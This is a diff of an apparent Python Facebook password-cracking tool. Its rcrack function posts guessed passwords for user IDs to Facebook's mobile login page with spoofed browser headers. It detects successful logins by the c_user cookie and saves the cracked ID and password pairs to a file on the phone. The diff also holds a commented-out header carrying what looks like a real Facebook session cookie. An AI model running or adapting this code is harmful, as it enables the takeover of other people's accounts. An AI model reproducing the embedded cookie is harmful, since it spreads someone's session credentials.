@@ -108,7 +108,7 @@ logo = ("""
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       :  \033[1;35m   IRFAN
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36m   Random
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         :  \033[1;35m   ???
-     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION :  \033[1;36m 1.0                   
+     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION :  \033[1;36m    1.0                   
 \033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
 
 """)
@@ -272,25 +272,22 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            'method':'GET',
-            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-            'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=PP60ZOS6FHqiXytOPBpSQKRb; sb=PP60ZHa0qOrnpkRXk6KBFzFz; dnonce=AWmXJnGVNEYmT_u3MmV1O4a6NRzI6eUdAVxR-vE_UUCAxExIG-8KXSpPLfTkD2v5ob4PgtmJqhiTIeIup4mnDFil; m_pixel_ratio=2.0625; locale=en_US; x-referer=eyJyIjoiL2Vycm9yL2luZGV4LnBocD9lcnI9ZWMma2Vycj0xMzU3MDA0JmtlcnJfc3VtbWFyeT1Tb3JyeSUyQyUyMHNvbWV0aGluZyUyMHdlbnQlMjB3cm9uZyZrZXJyX2Rlc2NyaXB0aW9uPVBsZWFzZSUyMHRyeSUyMGNsb3NpbmclMjBhbmQlMjByZS1vcGVuaW5nJTIweW91ciUyMGJyb3dzZXIlMjB3aW5kb3cuIiwiaCI6Ii9lcnJvci9pbmRleC5waHA%2FZXJyPWVjJmtlcnI9MTM1NzAwNCZrZXJyX3N1bW1hcnk9U29ycnklMkMlMjBzb21ldGhpbmclMjB3ZW50JTIwd3Jvbmcma2Vycl9kZXNjcmlwdGlvbj1QbGVhc2UlMjB0cnklMjBjbG9zaW5nJTIwYW5kJTIwcmUtb3BlbmluZyUyMHlvdXIlMjBicm93c2VyJTIwd2luZG93LiIsInMiOiJtIn0%3D; zsh=ASSqtUvLaVH34GsTBsVH6-xAdPO-7yZHCr-uNVivDfe46FLxtR1H_DuvgT3dGuPuIeAZ4ikVlHAyV9IISBJc4wBFOyflynzDAgmKGrmkdvfCNBclvsWOzO1uCRBpw6FcqUYuU7rSZOh-qC2tekz56qg1yh59HTGcau9uIRV-WCuP1slWOj5sDD36JPZ3vfXpFC19FaUUgCPV2ehT82zAnQVWAuj-a25AsKx2ngD03F-HS-_Y-ilVtUysg4m7oKMNLU5ZsJtwwyp2yhvHsyDEKjiNRGz_hUxxLQLqgHZx7DXIsCiUQuun-aHEYbzE0fdA1KXZ9F4c; wl_cbv=v2%3Bclient_version%3A2289%3Btimestamp%3A1689583285; vpd=v1%3B653x350x2.0625; wd=350x653; fr=0lmJpZ0R6P9M64M6u.AWWwbnD5p2qVfCRU3SBv3rgGp2g.BktP48.mJ.AAA.0.0.BktP7R.AWUg7ufQm50',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent':pro,}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -305,7 +302,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                # print('\r\r\33[1;31m [IRFAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/DEATH-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/IRFAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
